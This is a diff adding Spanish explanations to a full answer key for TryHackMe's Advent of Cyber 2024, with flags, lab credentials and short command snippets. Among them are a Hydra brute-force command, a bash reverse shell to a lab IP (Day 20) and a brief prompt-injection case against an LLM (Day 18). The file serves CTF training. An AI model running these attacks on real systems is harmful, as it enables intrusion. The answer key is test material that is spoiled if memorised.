@@ -17,11 +17,15 @@
 
 ### Task 1: Introducción
 
+**Explicación:** Presentación de la edición 2024: un nuevo villano, el Mayor Malware (junto a Glitch), amenaza Wareville. La sala mezcla detección SOC, nube, WiFi, LLM y análisis de C2. Solo lectura.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee la introducción del evento. | `No answer needed` |
 
 ### Task 2: Preparación del laboratorio
+
+**Explicación:** Configuración del entorno: activar la máquina del día (confirmando acceso con `yes`), conectar por VPN/AttackBox, comprobar acceso web y red. Tarea de preparación.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -36,11 +40,15 @@
 
 ### Task 3: Historia de fondo
 
+**Explicación:** Backstory: la red de la ciudad de Wareville es atacada por Glitch y el Mayor Malware, que sabotean el gran evento navideño "Happy Elf" con ransomware y accesos no autorizados. Solo lectura.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Lee la historia del evento. | `No answer needed` |
 
 ### Task 4: Contexto del reto
+
+**Explicación:** Repaso del contexto operativo de la sala: objetivos diarios y cómo cada día añade una técnica nueva (SOC, detección, nube, hardware, LLM). Solo lectura.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -48,17 +56,23 @@
 
 ### Task 5: Cómo jugar
 
+**Explicación:** Explicación del formato: cada día una tarea con máquinas y preguntas de respuesta exacta, seguida en la interfaz del evento. Solo lectura.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Repasa el formato de las tareas diarias. | `No answer needed` |
 
 ### Task 6: Primeros pasos
 
+**Explicación:** Primeros pasos guiados dentro de la interfaz del laboratorio (simplejan o el panel del evento) para familiarizarse. Sin respuestas.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Realiza los primeros pasos del reto. | `No answer needed` |
 
 ### Task 7: Día 1 - Análisis SOC (reconocimiento)
+
+**Explicación:** Primera alerta SOC: se identifica al actor como `Tyler Ramsbey`, cuya información pública de perfil se recupera de `http://papash3ll.thm/data`; pertenece al grupo/organización llamado `Mayor Malware`. El perfil aporta `1` elemento clave a la alerta. Lección: correlacionar el perfil del adversario (OSINT) con la alerta del SIEM.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -71,6 +85,8 @@
 
 ### Task 8: Día 2 - Análisis de logs de Windows
 
+**Explicación:** Revisión de un Event Log de Windows: la cuenta que ejecutó el evento es `service_admin`, con PID `6791`, conexión desde `10.0.255.1`, timestamp `Dec 1, 2024 08:54:39.000` y el comando de PowerShell ejecutado `Install-WindowsUpdate -AcceptAll -AutoReboot` (evento tipo PowerShell/Sysmon). Lección: los Event Logs 4xxx/41xxx y el audit de PowerShell delatan actividad administrativa o maliciosa.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué cuenta de usuario ejecutó el evento analizado? | `service_admin` |
@@ -82,6 +98,8 @@
 
 ### Task 9: Día 3 - Detección de webshell
 
+**Explicación:** Búsqueda de una webshell en el servidor web: el archivo malicioso está en `/media/images/rooms/shell.php` y la IP `10.11.83.34` lo explota. La flag del caso es `THM{Gl1tch_Was_H3r3}`. Lección: revisar directorios de subida de imágenes en busca de archivos .php y logs de acceso.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la ruta del webshell subido al servidor web? | `/media/images/rooms/shell.php` |
@@ -90,6 +108,8 @@
 | 4 | Busca las trazas de la subida del webshell. | `No answer needed` |
 
 ### Task 10: Día 4 - Detección de ransomware (Sigma)
+
+**Explicación:** Laboratorio de detección: la primera flag es `THM{GlitchTestingForSpearphishing}`; el ataque de spearphishing usa la técnica MITRE `T1059` (Command and Scripting Interpreter), concretamente la sub-técnica `T1059.003` (Windows Command Shell). La regla/campaña simulada se llama `Simulate BlackByte Ransomware Print Bombing` y deja la nota `Wareville_Ransomware.txt`. La flag codificada en la regla Sigma es `THM{R2xpdGNoIGlzIG5vdCB0aGUgZW5lbXk=}` (la parte interna es base64 de "Glitch is not the enemy"). Lección: traducir el comportamiento del ransomware a reglas Sigma.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -103,6 +123,12 @@
 
 ### Task 11: Día 5 - Fuerza bruta
 
+**Explicación:** Fuerza bruta de accesos (login web/SSH): las flags del reto son `THM{Brut3f0rc1n6_mY_w4y}` y `THM{m4y0r_m4lw4r3_b4ckd00rs}`. Con Hydra y credenciales obtenidas se accede al servicio. Lección: contraseñas débiles y ausencia de rate-limiting permiten agotar el espacio de credenciales.
+
+```bash
+hydra -l usuario -P /usr/share/wordlists/rockyou.txt MACHINE_IP http-post-form "/login:user=^USER^&pass=^PASS^:F"
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la primera flag del reto de fuerza bruta? | `THM{Brut3f0rc1n6_mY_w4y}` |
@@ -112,6 +138,13 @@
 
 ### Task 12: Día 6 - Enumeración web
 
+**Explicación:** Enumeración del servidor web: la primera flag es `THM{GlitchWasHere}` y la segunda (pista oculta en el contenido/código) es `THM{HiddenClue}`. Recorriendo rutas y leyendo comentarios del HTML/JS se agotan las pistas. Lección: enumerar directorios y revisar el código fuente para encontrar contenido oculto.
+
+```bash
+gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirb/common.txt
+curl http://MACHINE_IP/pagina | grep -iE "flag|clue"
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la primera flag del servidor web? | `THM{GlitchWasHere}` |
@@ -119,6 +152,8 @@
 | 3 | Enumera el sitio hasta agotar las pistas. | `No answer needed` |
 
 ### Task 13: Día 7 - AWS CloudTrail (identidad y acceso)
+
+**Explicación:** Revisión de logs CloudTrail: el suceso analiza la acción de API `PutObject` sobre el bucket desde la IP `53.94.201.69`, con el dominio de autenticación `signin.amazonaws.com`, timestamp `2024-11-28T15:21:54Z`. La identidad que ejecuta es `glitch` con la política adjunta `AdministratorAccess`. En la revisión de eventos aparecen dos IPs (`53.94.201.69` y `31.210.15.79`) y cuatro IDs de cookie de sesión (`2394 6912 7723 1294`). Lección: CloudTrail permite auditar identidades, policies y orígenes en AWS.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -135,12 +170,16 @@
 
 ### Task 14: Día 8 - Recuperación del acceso
 
+**Explicación:** Con la identidad `glitch` comprometida/pwned se restablece el acceso a la consola AWS; la flag de recuperación es `AOC{GOT _MY_ACCESS_B@CK007}`. Lección: recuperar el control tras comprometer una identidad con AdministratorAccess.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la flag de recuperación del acceso al sistema? | `AOC{GOT _MY_ACCESS_B@CK007}` |
 | 2 | Restablece el acceso con la identidad comprometida. | `No answer needed` |
 
 ### Task 15: Día 9 - Gobernanza, Riesgo y Cumplimiento (GRC)
+
+**Explicación:** Introducción a GRC: la sigla significa `Governance, Risk, and Compliance`. La flag del reto es `THM{R15K_M4N4G3D}`. Se aplica el control de riesgo indicado (crear un registro de activos y accionar el plan). Lección: dimensionar el riesgo con políticas de gobernanza y compliance.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -150,12 +189,16 @@
 
 ### Task 16: Día 10 - Phishing
 
+**Explicación:** Análisis de un correo phishing: se revisa el remitente/dominio y el enlace completo para confirmar el fraude; la flag es `THM{PHISHING_CHRISTMAS}`. Lección: ver cabeceras y URLs antes de hacer clic; los enlaces acortados o de dominios sospechosos delatan el phishing.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la flag del análisis de phishing? | `THM{PHISHING_CHRISTMAS}` |
 | 2 | Analiza el correo y el enlace completo. | `No answer needed` |
 
 ### Task 17: Día 11 - WiFi (Evil Twin / hotspot)
+
+**Explicación:** Análisis de una captura WiFi (PCAP) con Wireshark/aircrack: el punto de acceso malicioso tiene MAC `02:00:00:00:02:00` y SSID `MalwareM_AP`; los dos clientes conectados tienen MACs `02:00:00:00:00:00` y `02:00:00:00:01:00`. En el portal falso (evil twin) se capturan las credenciales `fluffy/champ24`. Lección: los evil twins copian el SSID legítimo y roban credenciales del portal de autenticación.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -168,6 +211,12 @@
 
 ### Task 18: Día 12 - Race condition
 
+**Explicación:** Condición de carrera (TOCTOU): enviar dos peticiones simultáneas (p. ej., con `xargs -P2` o Burp Turbo Intruder) aprovecha la falta de sincronización del servicio; la flag es `THM{WON_THE_RACE_007}`. Lección: las verificaciones seguidas de uso (check-then-use) sin atomicidad son explotables con concurrencia.
+
+```bash
+(echo "A"; sleep 1; echo "B") | xargs -P2 -I{ } curl ... 
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la flag del reto de falta de sincronización (TOCTOU)? | `THM{WON_THE_RACE_007}` |
@@ -176,6 +225,8 @@
 
 ### Task 19: Día 13 - Vehículos / servicios
 
+**Explicación:** Explotación de los servicios del "trineo" de la ciudad (el reto usa una API/servicio de vehículos). Las flags son `THM{dude_where_is_my_car}` y `THM{my_name_is_malware._mayor_malware}`. Lección: los servicios no documentados de la infraestructura pueden exponer control de dispositivos.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la primera flag del reto de servicios? | `THM{dude_where_is_my_car}` |
@@ -183,6 +234,8 @@
 | 3 | Explota el servicio del vehículo para cerrar el caso. | `No answer needed` |
 
 ### Task 20: Día 14 - Linux (host comprometido)
+
+**Explicación:** Reconocimiento del host Linux: el hostname es `THM` y el usuario con sesión activa es `c4rrotn0s3`. Las flags del sistema son `THM{AoC-3lf0nth3Sh3lf}` y `THM{AoC-h0wt0ru1nG1ftD4y}`; la contraseña del usuario SOC encontrada en el sistema es `H0llyJ0llySOCMAS!`. Lección: revisar procesos, cronjobs y archivos de configuración en el host comprometido para escalar.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -194,6 +247,8 @@
 | 6 | Escala y consolida el acceso en el host. | `No answer needed` |
 
 ### Task 21: Día 15 - Eventos de Windows y Active Directory
+
+**Explicación:** Análisis de eventos del DC: el logon analizado ocurre el `07/11/2024` con Event ID `4624` (logon exitoso); se detecta el comando de PowerShell `Get-ADUser -Filter * -Properties MemberOf | Select-Object Name` para enumerar AD. También aparece la contraseña en claro `SuperSecretP@ssw0rd!` y el GPO malicioso de persistencia `Malicious GPO - Glitch_Malware Persistence`. Lección: Windows Event Logs + PowerShell auditing revelan enumeración y persistencia en el dominio.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -207,6 +262,12 @@
 
 ### Task 22: Día 16 - Recuperación de secretos
 
+**Explicación:** Recuperación de secretos (LAPS/objetos protegidos de AD): el secreto de recuperación es `R3c0v3r_s3cr3ts!`, el GUID del objeto protegido `7d96660a-02e1-4112-9515-1762d0cb66b7`, el usuario `aoc2024` con contraseña `aoc2024` y la contraseña del usuario recuperado es `WhereIsMyMind1999`. Lección: los atributos protegidos/ms-Mcs-AdmPwd exponen contraseñas si los permisos están mal configurados.
+
+```powershell
+Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la clave/secreto de recuperación encontrado? | `R3c0v3r_s3cr3ts!` |
@@ -216,6 +277,8 @@
 | 5 | Restaura el acceso con los secretos extraídos. | `No answer needed` |
 
 ### Task 23: Día 17 - Base de datos
+
+**Explicación:** Consulta a una base de datos (SQL): la primera consulta devuelve `642` elementos, la tabla consultada guarda el token/secreto `rij5uu4gt204q0d3eb7jj86okt` y el usuario que ejecuta la consulta es `mmalware`. Lección: credenciales de BD compartidas y tablas con secretos en claro comprometen el motor completo.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -227,6 +290,8 @@
 
 ### Task 24: Día 18 - LLM (prompt injection)
 
+**Explicación:** Prompt injection sobre un servicio LLM de salud (Hospital): se manipula la entrada del sistema (el `system prompt`) para que revele información. La consulta al servicio de salud `status` devuelve la respuesta buscada y la flag `THM{WareW1se_Br3ach3d}`. Lección: los LLM conectados a herramientas (function calling) pueden ser manipulados para ejecutar acciones no autorizadas.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué parte del sistema se manipula como entrada en el ataque? | `system prompt` |
@@ -237,6 +302,12 @@
 
 ### Task 25: Día 19 - Crackeo de contraseñas
 
+**Explicación:** Crackeo de hashes con la wordlist del laboratorio (rockyou): las flags son `THM{one_tough_password}`, `THM{credit_card_undeclined}` y `THM{dont_smash_your_keyboard}`. Lección: hashes MD5/NTLM sin salt y contraseñas predecibles se recuperan con john/hashcat.
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+```
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la primera flag del reto de crackeo? | `THM{one_tough_password}` |
@@ -246,6 +317,13 @@
 | 5 | Termina de crackear el resto de hashes. | `No answer needed` |
 
 ### Task 26: Día 20 - Acceso remoto (reverse shell)
+
+**Explicación:** Reverse shell desde la máquina comprometida: al ganar acceso la shell muestra `I am in Mayor!`, enviada a la IP `10.10.123.224`. Usando `whoami` se confirma la identidad y se lee `credentials.txt`, cuyo secreto es `THM_Secret_101`. Lección: montar un listener con netcat y ejecutar un payload de reverse shell para interactuar.
+
+```bash
+nc -lvnp 4444
+# en la víctima: bash -i >& /dev/tcp/10.10.123.224/4444 0>&1
+```
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -258,6 +336,8 @@
 
 ### Task 27: Día 21 - Análisis de C2 (mayorc2)
 
+**Explicación:** Análisis del binario/tráfico del C2: al recibir la instrucción, el malware ejecuta `DownloadAndExecuteFile` (descarga y ejecuta), usa `explorer.exe` como proceso contenedor (process hollowing/injection), contacta el C2 `mayorc2.thm`, empaqueta los datos robados en `CollectedFiles.zip` y pivota a un segundo dominio `anonymousc2.thm`. Lección: identificar comando C2, contenedor de proceso y rutas de exfiltración.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Qué acción ejecuta el malware cuando recibe la instrucción? | `DownloadAndExecuteFile` |
@@ -268,6 +348,8 @@
 | 6 | Documenta el flujo de la comunicación C2. | `No answer needed` |
 
 ### Task 28: Día 22 - Análisis del servidor web comprometido
+
+**Explicación:** Reconstrucción de la intrusión en el servidor web a partir de logs de acceso: el primer webshell es `shelly.php`, le sigue el archivo de configuración `db.php`; el atacante se conecta con `nc` (netcat) desde `10.10.130.253`. El acceso sospechoso abarca de `29/Oct/2024:10:06:33 +0000` a `29/Oct/2024:12:34:28 +0000`. En el log de Docker se exfiltran credenciales del registro: `{"auths":{"http://docker-registry.nicetown.loc:5000":{"username":"mr.nice","password":"Mr.N4ughty","auth":"bXIubmljZTpNci5ONHVnaHR5"}}}`. Lección: correlacionar timestamps y archivos para reconstruir el kill chain.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
@@ -282,6 +364,8 @@
 
 ### Task 29: Día 23 - Red inalámbrica (contraseña)
 
+**Explicación:** El dispositivo WiFi comprometido usa una contraseña por defecto en el portal: `fluffycat12`; conectando con ella se obtiene la flag `THM{do_not_GET_CAUGHT}`. Lección: las contraseñas por defecto de routers/dispositivos permiten entrar sin conocer la red.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la contraseña por defecto del dispositivo comprometido? | `fluffycat12` |
@@ -290,6 +374,8 @@
 
 ### Task 30: Día 24 - Cierre del evento
 
+**Explicación:** Episodio final de la historia: tras desarticular al Mayor Malware, la flag de cierre es `THM{Ligh75on-day54ved}`. Repaso de conclusiones de la temporada.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | ¿Cuál es la flag final de la historia del evento? | `THM{Ligh75on-day54ved}` |
@@ -297,11 +383,15 @@
 
 ### Task 31: Encuesta
 
+**Explicación:** Encuesta de valoración del evento para cerrar la edición 2024.
+
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
 | 1 | Responde a la encuesta de cierre del evento. | `No answer needed` |
 
 ### Task 32: Flag de despedida
+
+**Explicación:** Tras completar el evento, la flag de despedida anuncia la próxima edición: `THM{we_will_be_back_in_2025}`.
 
 | # | Pregunta | Respuesta |
 |---|----------|-----------|
